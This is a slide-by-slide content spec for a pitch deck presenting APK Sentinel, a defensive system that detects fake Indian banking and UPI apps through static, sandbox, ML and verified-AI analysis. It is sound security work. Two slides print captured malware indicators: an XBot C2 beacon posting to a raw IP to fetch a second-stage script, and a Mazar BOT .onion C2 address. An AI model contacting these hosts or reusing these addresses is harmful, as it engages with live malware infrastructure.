# APK Sentinel — Pitch Deck Content & Build Spec

*For Claude Design + Canva plugin. Template/visual theme already chosen — this
file supplies **content only**: per-slide headline, body text, a visual
suggestion, and a one-line speaker note. Text is pre-trimmed for slides (short
phrases, not paragraphs) — do not expand it back into prose when placing it.*

**Deck length:** 16 slides, ~10–12 min spoken. **Required sections present:**
Novelty (slides 6–7), Technical Feasibility (8–9), Model Explainability (10),
Scalability (11) — each explicitly labeled so a judge can find it instantly.
UI Design is folded into slide 12 (live demo) since it's best shown, not told.

---

## Slide map (quick reference)

| # | Slide | Section |
|---|---|---|
| 1 | Title | — |
| 2 | The Problem | Context |
| 3 | The Pitch | Context |
| 4 | Architecture — the Evidence Spine | Context |
| 5 | Architecture — Seven Layers | Context |
| 6 | **Novelty** — What's Actually New | **Novelty** |
| 7 | **Novelty** — Anti-Hallucination AI | **Novelty** |
| 8 | **Technical Feasibility** — It Runs Today | **Technical Feasibility** |
| 9 | **Technical Feasibility** — Live Capture | **Technical Feasibility** |
| 10 | **Model Explainability** — Every Point Traces to Evidence | **Model Explainability** |
| 11 | **Scalability** — Throughput & Limits | **Scalability** |
| 12 | Live Demo / UI Walkthrough | UI Design |
| 13 | Real Catch: Mazar's Hidden C2 | Proof point |
| 14 | What's Next | Roadmap |
| 15 | Recap | Close |
| 16 | Thank You / Q&A | Close |

---

## Slide 1 — Title

**Headline:** APK Sentinel

**Subhead:** Evidence-driven detection of banking-malware apps impersonating
Indian banks & UPI services

**Body:** Team name · event name · date

**Visual:** App/shield icon mark, dark-to-light gradient background (or match
template default). Keep clean — no diagram on the title slide.

**Speaker note:** Open with the tagline, not the acronym soup. "We built a
system that doesn't just say an app is malicious — it shows you the exact
evidence."

---

## Slide 2 — The Problem

**Headline:** Fake banking apps are a fraud vector, not just a security bug

**Body (3 bullets max):**
- Fraudulent APKs impersonate SBI, HDFC, ICICI, UPI apps, and government
  services to steal OTPs, UPI PINs, and credentials
- Existing scanners (VirusTotal, MobSF) answer **"is this app insecure?"** —
  not **"is this app pretending to be my bank?"**
- Verdicts from most tools are a black-box score — nothing an analyst or a
  bank can act on with confidence

**Visual:** A simple two-column icon comparison: a real bank app icon vs. a
near-identical fake, with a "?" between them. Or a stat callout: "Banking
trojans impersonating Indian institutions — a growing, underserved threat
class."

**Speaker note:** Ground the problem in the *fraud*, not the malware — that's
the differentiation that carries through the whole deck.

---

## Slide 3 — The Pitch

**Headline:** One evidence-backed verdict, not a black-box score

**Body (big-quote style, one line):**
*"This app is 92% likely to be a banking trojan impersonating SBI — and here
is the exact code and network traffic that proves it."*

**Sub-bullets (small, under the quote):**
- Seven-layer pipeline · every layer adds evidence to one shared record
- Static + live-detonation + ML + verified AI reasoning + auditable scoring

**Visual:** Large pull-quote treatment (this is the "hero" slide — biggest
type on the deck after the title).

**Speaker note:** This is the one sentence a judge should remember if they
remember nothing else.

---

## Slide 4 — Architecture: the Evidence Spine

**Headline:** Every layer writes to one shared, auditable record

**Body:**
- One record per app, keyed by its **SHA-256** fingerprint
- Each layer adds findings — nothing is recomputed, nothing is lost
- Every number in the final report traces back to the exact finding that
  produced it

**Visual:** A simple diagram — a vertical spine/column with 7 layer blocks
attached to it left-to-right or top-to-bottom, each feeding into the same
central record icon (file/database symbol). This is the one diagram worth
getting right — it's referenced again in slide 10.

**Speaker note:** "Auditability" is the word to land here — it's the thread
that ties Novelty, Feasibility, and Explainability together later.

---

## Slide 5 — Architecture: Seven Layers

**Headline:** L0 → L6 — triage to verdict

**Body (compact table or icon row, 7 items, ≤4 words each):**
| Layer | One line |
|---|---|
| L0 Triage | Bank-impersonation check |
| L1 Static | Decompile + rule-scan |
| L2 Dynamic | Live sandboxed detonation |
| L3 ML | Bounded maliciousness prior |
| L4 GenAI | Verified code reasoning |
| L5 Scoring | Auditable additive score |
| L6 Output | Dashboard + IOC export |

**Visual:** A horizontal pipeline diagram, 7 icons left to right, each with
its one-line label underneath. Keep icons simple (magnifying glass, gear,
phone/sandbox, chart, brain/chat bubble, scale/balance, monitor).

**Speaker note:** Move fast here — this slide is a map for what's coming, not
a deep-dive. "We'll zoom into the parts that matter for [Novelty /
Feasibility] next."

---

## Slide 6 — NOVELTY: What's Actually New

**Section label (visually distinct, e.g. colored tag):** NOVELTY

**Headline:** Not another "is this app risky" scanner

**Body (4 short punch-bullets):**
- **Bank-impersonation-first** — the actual fraud mechanism, not generic
  insecurity
- **Mechanically-verified AI reasoning** — every LLM claim is re-derived by
  code, not trusted
- **Auditable additive scoring** — every point traces to a named signal, not
  a black-box number
- **India-specific threat modeling** — UPI IDs, Indian mobile patterns,
  SBI/HDFC/ICICI-shaped fake-OTP injection

**Visual:** 4-quadrant or 4-icon grid, one per bullet. Keep icons distinct
(shield-with-check, brain-with-checkmark, balance-scale, India-outline or
flag accent).

**Speaker note:** This is a 30-point section — don't rush it, but don't read
the bullets verbatim either. Pick the AI-verification bullet to expand on
verbally; it carries into slide 7.

---

## Slide 7 — NOVELTY: Anti-Hallucination AI

**Section label:** NOVELTY (continued)

**Headline:** We caught our own AI lying — then built a system that can't

**Body (narrative, 3 short beats):**
1. A candidate model decoded a malware string as `.../get.php`
2. The real answer — one line of code proved it — was `gate.php`
3. So every checkable AI claim is now **re-derived independently**: decoded
   strings re-decoded, renamed identifiers checked against real code, API
   calls verified present, indicators accepted only if a deterministic layer
   already found them first

**Callout stat:** *Claims that fail verification are **dropped, not
down-weighted** — and the drop is recorded.*

**Visual:** A simple before/after: a crossed-out "get.php" next to a
checkmarked "gate.php", or a 3-step mini-flowchart (Analyst claim → Mechanical
check → Kept / Dropped).

**Speaker note:** This is the single best "aha" moment in the deck — a real
measured failure that justifies the entire design. Slow down here.

---

## Slide 8 — TECHNICAL FEASIBILITY: It Runs Today

**Section label:** TECHNICAL FEASIBILITY

**Headline:** Not a mockup — a working pipeline, measured end to end

**Body (stat-grid, 4 big numbers with tiny labels — this is a "numbers" slide):**
- **412** automated tests passing
- **3,664** samples scored
- **3,090 / 604** malware / benign corpus
- **37%** malware-category detection *(up from a measured 8% baseline)*

**Visual:** 4 large stat callouts in a grid (classic "by the numbers" layout
— use the template's stat/KPI component if it has one).

**Speaker note:** These are measured numbers, not estimates — worth saying
"measured" out loud once here to set the tone for the rest of the section.

---

## Slide 9 — TECHNICAL FEASIBILITY: Live Capture

**Section label:** TECHNICAL FEASIBILITY (continued)

**Headline:** Real malware, live-detonated, safely contained

**Body:**
- Isolated Android emulator, network locked down with **fail-closed**
  isolation (verified by an actual failed ping test, not assumed)
- Live-detonated the **XBot** banking trojan — captured its real C2 beacon
  requesting a second-stage payload
- Containment layer **blocked it** — logged, not silently let through

**Callout (monospace, code-block style for authenticity — this is the exact
decoded payload, keep it verbatim):**
```
POST http://192.227.137.154/request.php
{"name": "bootScriptNet", "action": "get_script"}   →  BLOCKED
```

**Visual:** The code-block callout above as a visual element (styled like a
terminal/log snippet) — this reads as "real," which is the point.

**Speaker note:** If there's time for one live demo moment in the talk, this
is it — it's the most concrete "this actually works" proof in the deck.

---

## Slide 10 — MODEL EXPLAINABILITY: Every Point Traces to Evidence

**Section label:** MODEL EXPLAINABILITY

**Headline:** Ask "why" and get a real answer, not a probability

**Body:**
- Final score = **sum of named, evidence-linked contributions** — not a
  single opaque model output
- Every AI claim is labeled **verified** or **unverified**, with a reason
  when dropped
- Confidence is reported **separately** from the score — low-coverage runs
  are flagged, never silently blended in
- "Smoking-gun" gates show **which specific conditions fired**, with
  evidence IDs

**Visual:** Reuse the evidence-spine diagram from slide 4, but now with
example annotations pointing off of it: *"+3.0 → yara:SMS_Suppression
(F004)"*, *"+2.5 → l0:brand_claim (F001)"* — showing the actual audit trail
concept visually.

**Speaker note:** Contrast directly with a black-box classifier here —
"most ML security tools give you a number; we give you the receipt."

---

## Slide 11 — SCALABILITY: Throughput & Limits

**Section label:** SCALABILITY

**Headline:** Built to grow — and honest about where it's at today

**Body, two columns:**

*Scales:*
- Resumable corpus runner — **705 samples in ~57 minutes**, measured
- Every layer independently skippable per sample (static-only pass in
  seconds, full forensic depth on demand)
- Disk- and cost-safety built in — decompiled output disposed per sample,
  every AI call runs under a hard budget cap

*Honest current limits:*
- One emulator instance today (parallelizable, not yet parallelized)
- LLM calls are the throughput bottleneck at large scale
- Some rule weights are provisional until the benign corpus grows further —
  and the system **says so**, rather than overclaiming confidence

**Visual:** Simple two-column layout, checkmarks for "scales," a neutral
info-icon (not a warning icon) for "honest limits" — framing limits as
transparency, not weakness.

**Speaker note:** Judges respect honesty about limits far more than a claim
of "infinitely scalable" — say the limits plainly and move on confidently.

---

## Slide 12 — Live Demo / UI Walkthrough

**Headline:** One dashboard: pick an app, run it, watch it live

**Body (numbered walkthrough, matches a live demo or screenshot sequence):**
1. Pick a sample, choose which layers to run (skip the emulator for a
   fast static-only pass)
2. Watch a **live streaming feed** of every pipeline stage as it happens —
   not a spinner
3. Watch the **live emulator screen** and the AI navigator's actions in
   real time
4. **Stop mid-run** safely — cleanup still runs, nothing left broken
5. Get the verdict, the evidence breakdown, and one-click **STIX / CSV /
   YARA / Sigma** export

**Visual:** Screenshot of the actual dashboard (light theme, verdict panel +
live sandbox panel visible) — **use a real screenshot here**, not a mockup,
if one is available before the deck is finalized.

**Speaker note:** If doing a live demo instead of screenshots, this is the
slide to demo live against — keep the walkthrough steps as your on-screen
checklist.

---

## Slide 13 — Real Catch: Mazar's Hidden C2

**Headline:** Found what a normal scanner would miss

**Body:**
- The **Mazar BOT** banking trojan's real C2 address wasn't in its code at
  all — it was hidden inside a **compiled Android string resource**
  (`res/values/strings.xml`, field name `server_url`)
- Most static scanners only look at code — this one was invisible to a
  code-only scan
- Extended the extraction pipeline to also scan the compiled resource table
  — the address surfaced immediately

**Callout:**
```
<string name="server_url">http://pc35hiptpcwqezgs.onion</string>
```

**Visual:** The XML snippet above as a styled code-block callout, maybe with
a magnifying-glass icon emphasizing "hidden, then found."

**Speaker note:** This is a second concrete proof point (after slide 9) —
use it if there's time; cut it first if the deck runs long, since slide 9
already carries the "real capture" moment.

---

## Slide 14 — What's Next

**Headline:** Where this goes from here

**Body (3–4 short items, forward-looking, confident not apologetic):**
- Native-code analysis (Ghidra integration) for the ~12% of samples with
  native libraries
- Grow the benign corpus further to fully mature every rule's statistical
  weight
- Parallelize live detonation across multiple emulator instances
- Expand the India-specific indicator set (more banks, more UPI handles)

**Visual:** Simple forward-arrow or roadmap icon row, 3–4 milestones.

**Speaker note:** Keep this slide short — a roadmap slide that runs long
kills momentum right before the close.

---

## Slide 15 — Recap

**Headline:** What we built, in one breath

**Body (4 lines, one per required section, deliberately mirroring slides
6–11 so it reads as a summary, not new content):**
- **Novel**: bank-impersonation-first detection + mechanically-verified AI
- **Feasible**: 412 tests passing, real live malware captured and contained
- **Explainable**: every score point traces to named evidence
- **Scalable**: hundreds of samples per run, honest about today's limits

**Visual:** Match slide 3's pull-quote styling for consistency — this is the
bookend to the pitch slide.

**Speaker note:** Say each line, pause half a beat between them — this is
the "if you only heard 20 seconds" summary.

---

## Slide 16 — Thank You / Q&A

**Headline:** Thank you

**Body:** Team names · contact/repo link if sharing one · "Questions?"

**Visual:** Match slide 1's styling — bookend the deck visually.

**Speaker note:** Stop talking. Let the question come.

---

## Notes for whoever builds this in Claude Design

- **Don't reflow the bullet text into paragraphs** — it's already trimmed to
  slide length; expanding it will overflow the template's text boxes.
- **Stat callouts (slides 8, 9, 13, 15)** are meant to be visually distinct
  from body bullets — use the template's KPI/stat/quote components where one
  exists, not another bullet list.
- **Code-block callouts** (slides 9, 13) should render in a monospace font
  even if the rest of the deck doesn't use one — it signals "this is a real
  captured artifact," which is the point.
- **Slide 4's spine diagram is reused conceptually in slide 10** — keep the
  visual language (the same "record" icon, the same layer-block shape)
  consistent between them so the callback lands.
- Full technical backing for every claim in this deck lives in
  `docs/PRESENTATION_GUIDE.md` in this repo — pull from there if a judge
  asks a follow-up question this deck doesn't cover.
